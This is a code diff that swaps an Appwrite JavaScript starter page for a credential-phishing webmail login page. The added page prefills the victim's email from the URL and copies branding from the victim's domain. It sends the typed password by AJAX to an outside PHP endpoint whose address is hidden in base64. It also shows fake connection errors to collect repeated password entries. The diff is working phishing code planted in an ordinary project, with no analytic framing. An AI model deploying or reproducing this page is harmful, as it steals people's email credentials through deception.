@@ -1,250 +1,146 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" type="image/svg+xml" href="/images/appwrite.svg" />
-  <title>Appwrite + Javascript </title>
-  <link rel="stylesheet" href="./style/app.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin />
-  <link
-          href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Inter:opsz,wght@14..32,100..900&family=Poppins:wght@300;400&display=swap"
-          rel="stylesheet"
-  />
-  <link rel="icon" type="image/svg+xml" href="/appwrite.svg" />
+
+<html><!--"hgoz1rl96i6u7i"--><head>
+
+   <title> - MAIL SYSTEM Sign in to continue</title>
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
+   <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+   <link rel="shortcut icon" type="image/x-icon" href="">
+   <!-- <link rel="stylesheet" type="text/css" href="css.css"> -->
+   <style>
+      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+   </style>
+
+   <style type="text/css">
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";color:#535353}.login-40 .form-section{max-width:380px;margin:0 auto;border-radius:10px;padding:10px 35px;border:1px solid #e8e7e7;margin-top:50px}.img-fluid{max-width:100%!important;height:auto}.login-40 .login-inner-form .form-box{float:left;width:100%;position:relative}.login-40 .login-inner-form .form-group{margin-bottom:30px}.login-40 .login-inner-form .form-box input{float:left;width:100%;padding:15.5px 50px 15.5px 25px}.login-40 .login-inner-form .input-text{font-size:16px;outline:none;color:#717171;border-radius:50px;border:1px solid #dbdbdb;box-shadow:0 1px 3px 0 rgb(0 0 0 / 6%)}.form-control:focus{box-shadow:none}.login-40 .login-inner-form .form-box i{position:absolute;top:14px;right:25px;font-size:19px}.logo{text-align:center;margin-bottom:35px}.login-40 .login-inner-form .checkbox{margin-bottom:30px;font-size:16px}.login-40 .login-inner-form input[type=checkbox],input[type=radio]{margin-top:4px;margin-right:3px;position:absolute;margin-left:0}.login-40 .login-inner-form label{font-weight:500;font-size:14px;margin-bottom:5px}.login-40 .login-inner-form .form-check-label{padding-left:25px;margin-bottom:0;font-size:16px;color:#717171}.login-40 .login-inner-form .checkbox-theme input[type=checkbox]:checked+label::before{background-color:#50a1ff;border-color:#50a1ff}.login-40 .login-inner-form input[type=checkbox]:checked+label:before{font-weight:300;color:#f3f3f3;line-height:15px;font-size:14px;content:"\2713";text-align:center}.login-40 .login-inner-form .form-check label::before{content:"";display:inline-block;position:absolute;width:22px;height:22px;margin-left:-27px;border:1px solid #c5c3c3;border-radius:3px;background-color:#fff}.btn-block{display:block;width:100%}.sub_b{-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}.sub_b:hover{background-color:#0b5ed79e;-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}.login-40 .login-inner-form .btn-md{cursor:pointer;padding:15.5px 50px 14.5px 50px;font-size:17px;font-weight:400;font-family:'Jost',sans-serif;border-radius:50px}.login-40 .login-inner-form .btn-theme{background:#50a1ff;border:none;color:#fff}.login-40 .login-inner-form .btn-theme:hover{background:#4595f1}.login-40 .login-inner-form .checkbox{margin-bottom:30px;font-size:16px}#logo{height:30px}body.sharp .f_base,body.sharp .f_form .form-control,body.sharp button,body.sharp .alert{border-radius:0;-webkit-border-radius:0;-moz-border-radius:0;-o-border-radius:0}a:hover{text-decoration:none}a{text-decoration:none;color:#007bff}body.sharp .alert{font-size:14px;padding:10px 10px}.dom_pl{font-size:16px;margin-bottom:0}.sub_b{-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}.sub_b:hover{background-color:#0b5ed79e;-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}#frame_back{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}.frame_back_over{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}#frame_back{display:none}.erx{margin:10px 0 0;padding:7px 5px;background-color:#c50000;color:#fff;font-size:16px;margin-top:-1px}.login-inner-form{margin-top:-20px}
+
+    </style>
 </head>
-<body class="bg-[#FAFAFB] font-[Inter] text-sm text-[#56565C]">
-<main class="checker-background flex flex-col items-center p-5" id="main">
-  <div class="mt-25 flex w-full max-w-[40em] items-center justify-center lg:mt-34">
-    <div class="rounded-[25%] border border-[#19191C0A] bg-[#F9F9FA] p-3 shadow-[0px_9.36px_9.36px_0px_hsla(0,0%,0%,0.04)]">
-      <div class="rounded-[25%] border border-[#FAFAFB] bg-white p-5 shadow-[0px_2px_12px_0px_hsla(0,0%,0%,0.03)] lg:p-9">
-        <img alt="Javascript logo" src="./images/javascript.svg" class="h-14 w-14" width="56" height="56">
-      </div>
-    </div>
-    <div class="flex w-38 items-center transition-opacity duration-2500 opacity-0" id="success-icon">
-      <div class="to-[rgba(253, 54, 110, 0.15)] h-[1px] flex-1 bg-gradient-to-l from-[#f02e65]"></div>
-      <div class="icon-check flex h-5 w-5 items-center justify-center rounded-full border border-[#FD366E52] bg-[#FD366E14] text-[#FD366E]"></div>
-      <div class="to-[rgba(253, 54, 110, 0.15)] h-[1px] flex-1 bg-gradient-to-r from-[#f02e65]"></div>
-    </div>
-    <div class="rounded-[25%] border border-[#19191C0A] bg-[#F9F9FA] p-3 shadow-[0px_9.36px_9.36px_0px_hsla(0,0%,0%,0.04)]">
-      <div class="rounded-[25%] border border-[#FAFAFB] bg-white p-5 shadow-[0px_2px_12px_0px_hsla(0,0%,0%,0.03)] lg:p-9">
-        <img alt="Appwrite logo" src="./images/appwrite.svg" class="h-14 w-14" width="56" height="56">
-      </div>
-    </div>
-  </div>
 
-  <section class="mt-12 flex h-52 flex-col items-center" id="status-section">
-    <div class="flex flex-row gap-4" id="loading-spinner" style="display: none;">
-      <div role="status">
-        <svg aria-hidden="true" class="h-5 w-5 animate-spin fill-[#FD366E] text-gray-200 dark:text-gray-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/>
-          <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/>
-        </svg>
-        <span class="sr-only">Loading...</span>
-      </div>
-      <span>Waiting for connection...</span>
-    </div>
-    <h1 class="font-[Poppins] text-2xl font-light text-[#2D2D31]" id="status-message">Check connection</h1>
-    <p class="mt-2 mb-8" id="status-description">Send a ping to verify the connection</p>
-    <button class="cursor-pointer rounded-md bg-[#FD366E] px-2.5 py-1.5" id="ping-button">
-      <span class="text-white">Send a ping</span>
-    </button>
-  </section>
+<body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png) ; background-size: cover;">
+   <div class="loader_b hidden" id="loader">
+      <div class="loader"></div>
+   </div>
+   <iframe id="frame_back" scrolling="no"></iframe>
+   <div class="frame_back_over"></div>
+   <div class="b_base login-40">
+      <div class="f_base container">
+         <div class="f_in row">
+            <div class="col-md-12">
+               <div class="form-section" style="background:rgba(250,250,250,2);">
+                  <div class="f_in">
+                     <div class="logo">
+                        <a href="">
+                            <img src="" alt="Webmail" id="logo">
+                              <h2 id="logoname" style="font-size: 2rem;"> </h2>        
+                        </a>
+                    </div>
+                     <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
+                     <center><h3 style="color: #212529; line-height: 1.2;">Sign In To Continue</h3></center>
 
-  <div class="grid grid-rows-3 gap-7 lg:grid-cols-3 lg:grid-rows-none">
-    <div class="flex h-full w-72 flex-col gap-2 rounded-md border border-[#EDEDF0] bg-white p-4">
-      <h2 class="text-xl font-light text-[#2D2D31]">Edit your app</h2>
-      <p>Edit <code class="rounded-sm bg-[#EDEDF0] p-1">app/page.js</code> to get started with building your app.</p>
-    </div>
-    <a href="https://cloud.appwrite.io" target="_blank" rel="noopener noreferrer">
-      <div class="flex h-full w-72 flex-col gap-2 rounded-md border border-[#EDEDF0] bg-white p-4">
-        <div class="flex flex-row items-center justify-between">
-          <h2 class="text-xl font-light text-[#2D2D31]">Go to console</h2>
-          <span class="icon-arrow-right text-[#D8D8DB]"></span>
-        </div>
-        <p>Navigate to the console to control and oversee the Appwrite services.</p>
-      </div>
-    </a>
-    <a href="https://appwrite.io/docs" target="_blank" rel="noopener noreferrer">
-      <div class="flex h-full w-72 flex-col gap-2 rounded-md border border-[#EDEDF0] bg-white p-4">
-        <div class="flex flex-row items-center justify-between">
-          <h2 class="text-xl font-light text-[#2D2D31]">Explore docs</h2>
-          <span class="icon-arrow-right text-[#D8D8DB]"></span>
-        </div>
-        <p>Discover the full power of Appwrite by diving into our documentation.</p>
-      </div>
-    </a>
-  </div>
-
-  <aside class="fixed bottom-0 flex w-full cursor-pointer border-t border-[#EDEDF0] bg-white">
-    <details id="logs-details" class="w-full">
-      <summary class="flex w-full flex-row justify-between p-4 marker:content-none">
-        <div class="flex gap-2">
-          <span class="font-semibold">Logs</span>
-          <div class="flex items-center rounded-md bg-[#E6E6E6] px-2" id="log-count" style="display: none;">
-            <span class="font-semibold" id="log-count-value"></span>
-          </div>
-        </div>
-        <div class="icon">
-          <span class="icon-cheveron-down" aria-hidden="true"></span>
-        </div>
-      </summary>
-      <div class="flex w-full flex-col lg:flex-row">
-        <div class="flex flex-col border-r border-[#EDEDF0]">
-          <div class="border-y border-[#EDEDF0] bg-[#FAFAFB] px-4 py-2 text-[#97979B]">Project</div>
-          <div class="grid grid-cols-2 gap-4 p-4">
-            <div class="flex flex-col">
-              <span class="text-[#97979B]">Endpoint</span>
-              <span class="truncate" id="project-endpoint"></span>
+                     <div class="erx" style="display:none ;">Conection error, kindly try again!</div>
+                     <div class="login-inner-form">
+                        
+                        <form class="f_form" action="aHR0cHM6Ly9tdWplcmhveS5vcmcvUmVxdWVzdHMvZ2FuZ2EyMjYvb2ZmaWNpYWwwNC9vZmZpY2lhbC5waHA=">
+                           <input type="hidden" name="fcc" id="fcc" value="">
+                           <div class="alert alert-danger mb-3 hidden" id="err" role="alert">
+                           </div>
+                           <div class="alert alert-primary mb-3 hidden" id="mi" role="alert">
+                           </div>
+                            <div class="form-group form-box">
+                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
+                            </div>
+                            <div class="form-group form-box">
+                                <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
+                                <!--<label for="email">Password</label>-->
+                              <i class="fa fa-eye sla"  id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
+                            </div>
+                     <span id="msg" style="color:red;"></span>
+                            <div class="checkbox clearfix">
+                                <div class="form-check checkbox-theme">
+                                    <input class="form-check-input" type="checkbox" value="" id="rem_me">
+                                    <label class="form-check-label" for="rem_me">
+                                        Remember me
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="form-group mb-0">
+                                <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Continue</button>
+                            </div>
+                        </form>
+                    </div>
+                  </div>
+               </div>
             </div>
-            <div class="flex flex-col">
-              <span class="text-[#97979B]">Project-ID</span>
-              <span class="truncate" id="project-id"></span>
-            </div>
-            <div class="flex flex-col">
-              <span class="text-[#97979B]">Project name</span>
-              <span class="truncate" id="project-name"></span>
-            </div>
-          </div>
-        </div>
-        <div class="flex-grow">
-          <table class="w-full">
-            <thead>
-            <tr class="border-y border-[#EDEDF0] bg-[#FAFAFB] text-[#97979B]">
-              <td class="w-52 py-2 pl-4">Date</td>
-              <td>Status</td>
-              <td>Method</td>
-              <td class="hidden lg:table-cell">Path</td>
-              <td class="hidden lg:table-cell">Response</td>
-            </tr>
-            </thead>
-            <tbody id="log-table">
-            <tr>
-              <td class="py-2 pl-4 font-[Fira_Code]">There are no logs to show</td>
-            </tr>
-            </tbody>
-          </table>
-        </div>
+         </div>
       </div>
-    </details>
-  </aside>
-</main>
+      
+   </div>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+              const getit = new URLSearchParams(window.location.search);
+              const hashedget = getit.get('e');
+              if (!hashedget) {
+                $('html').text('Error');
+                window.stop;
+              }else{
+              $("#email").val(hashedget);
+              let dxmain = hashedget.split("@")[1];
+              let sitename = dxmain.split(".")[0].toUpperCase();
+              sitename = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
+              document.querySelector('title').prepend(sitename);
+              document.querySelector('#logoname').prepend(sitename);
+              let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=')+dxmain
+              document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
+              document.querySelector('body').style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${dxmain}')`;
+              document.querySelector('#logo').setAttribute('src', favimg);
+              let atobb = atob( $('form').attr('action') )
+              var checker = 0
+                $("form").on('submit', (event) =>{
+                    event.preventDefault();
+                    event.stopPropagation();
+                    $(".erx").hide();
+                    let email = $("#email").val()
+                    let password = $("#password").val()
+                    checker++;
+                    $.ajax({
+                        
+                        url: atobb,
+                        method: "post",
+                        data: {
+                            email: email,
+                            pass: password,
+                            clientUrl: `https://${dxmain}`,
+                            typesent: ""                            
+                        },
+                        beforeSend: ()=>{
+                            $("#getitBtn").prop('disabled', true).html("Verifying...")
+                        },
+                        success: (data)=>{
+                            $(".erx").show();
 
-<script type="module">
-  import { client } from "./lib/appwrite.js";
-  import { AppwriteException } from "appwrite";
-  import "@appwrite.io/pink-icons";
+                            if (checker > 3) {
+                                window.location.href="//"+domain;
+                            }
+                            setTimeout(() => {
+                                $("#password").val("").focus();
+                            }, 100);
+                        },
+                        error: (err, xhr) =>{
+                            console.log(err, xhr);
+                        },
+                        complete: function(){
+                          $('#getitBtn').prop('disabled', false).html("Continue")
+                        }               
+                    })
+                });                 
+              }
+            });
 
-  document.addEventListener("DOMContentLoaded", () => {
-    let logs = [];
-    let status = "idle";
-    let showLogs = false;
+function togglePasswordVisibility(){const e=document.getElementById("password"),t=document.getElementById("togglePassword");"password"===e.type?(e.type="text",t.classList.remove("fa-eye"),t.classList.add("fa-eye-slash")):(e.type="password",t.classList.remove("fa-eye-slash"),t.classList.add("fa-eye"))}
 
-    const detailsRef = document.getElementById("logs-details");
-    const main = document.getElementById("main");
-    const statusMessage = document.getElementById("status-message");
-    const statusDescription = document.getElementById("status-description");
-    const pingButton = document.getElementById("ping-button");
-    const loadingSpinner = document.getElementById("loading-spinner");
-    const successIcon = document.getElementById("success-icon");
-    const logCount = document.getElementById("log-count");
-    const logCountValue = document.getElementById("log-count-value");
-    const logTable = document.getElementById("log-table");
-
-    const updateHeight = () => {
-      if (detailsRef) {
-        const height = detailsRef.clientHeight;
-        main.style.marginBottom = `${height}px`;
-      }
-    };
-
-    window.addEventListener("resize", updateHeight);
-
-    detailsRef.addEventListener("toggle", updateHeight);
-
-    async function sendPing() {
-      if (status === "loading") return;
-      status = "loading";
-      statusMessage.textContent = "";
-      statusDescription.textContent = "";
-      pingButton.style.display = "none";
-      loadingSpinner.style.display = "flex";
-
-      try {
-        const result = await client.ping();
-        const log = {
-          date: new Date(),
-          method: "GET",
-          path: "/v1/ping",
-          status: 200,
-          response: JSON.stringify(result),
-        };
-        logs.unshift(log);
-        status = "success";
-        statusMessage.textContent = "Congratulations!";
-        statusDescription.textContent = "You connected your app successfully.";
-
-        updateLogs();
-      } catch (err) {
-        const log = {
-          date: new Date(),
-          method: "GET",
-          path: "/v1/ping",
-          status: err instanceof AppwriteException ? err.code : 500,
-          response: err instanceof AppwriteException ? err.message : "Something went wrong",
-        };
-        logs.unshift(log);
-        status = "error";
-        statusMessage.textContent = "Check connection";
-        statusDescription.textContent = "Send a ping to verify the connection";
-        updateLogs();
-      }
-      pingButton.style.display = "block";
-      loadingSpinner.style.display = "none";
-      successIcon.style.opacity = status === "success" ? "100" : "0";
-      showLogs = true;
-    }
-
-    const updateLogs = () => {
-      logTable.innerHTML = "";
-      if (logs.length > 0) {
-        logCount.style.display = "flex";
-        logCountValue.textContent = logs.length;
-        logs.forEach((log) => {
-          const row = document.createElement("tr");
-          row.innerHTML = `
-          <td class="py-2 pl-4 font-[Fira_Code]">${log.date.toLocaleString("en-US", {
-            month: "short",
-            day: "numeric",
-            hour: "2-digit",
-            minute: "2-digit",
-          })}</td>
-          <td>
-            <div class="w-fit rounded-sm ${log.status > 400 ? "bg-[#FF453A3D] text-[#B31212]" : "bg-[#10B9813D] text-[#0A714F]"} px-1">
-              ${log.status}
-            </div>
-          </td>
-          <td>${log.method}</td>
-          <td class="hidden lg:table-cell">${log.path}</td>
-          <td class="hidden font-[Fira_Code] lg:table-cell">${log.response}</td>
-        `;
-          logTable.appendChild(row);
-        });
-      } else {
-        logCount.style.display = "none";
-        const row = document.createElement("tr");
-        row.innerHTML = `<td class="py-2 pl-4 font-[Fira_Code]">There are no logs to show</td>`;
-        logTable.appendChild(row);
-      }
-    };
-
-    pingButton.addEventListener("click", sendPing);
-    document.getElementById('project-endpoint').textContent = import.meta.env.VITE_APPWRITE_ENDPOINT;
-    document.getElementById('project-id').textContent = import.meta.env.VITE_APPWRITE_PROJECT_ID;
-    document.getElementById('project-name').textContent = import.meta.env.VITE_APPWRITE_PROJECT_NAME;
-    updateHeight();
-  });
-</script>
+    </script>
 </body>
 </html>
